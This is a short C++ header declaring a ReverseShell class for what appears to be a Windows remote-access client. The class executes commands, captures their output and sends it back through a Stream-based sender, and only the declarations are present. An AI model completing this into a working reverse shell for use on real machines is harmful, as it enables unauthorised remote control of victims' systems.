#ifndef CLIENT_REVERSESHELL_H
#define CLIENT_REVERSESHELL_H
#include <fcntl.h>
#include <string>
#include <array>
#include <memory>
#include <iostream>
#include <cstring>
#include "Sender.h"
#include <windows.h>



class ReverseShell : public Sender{
private:
    std::string currentDirectory=".";
public:
    explicit ReverseShell(const Stream &stream);
    std::string executeCommand(const std::wstring&);
    static int runCmd(const std::string &commandToExecute, std::string& outOutput);
    void send() override;
};


#endif
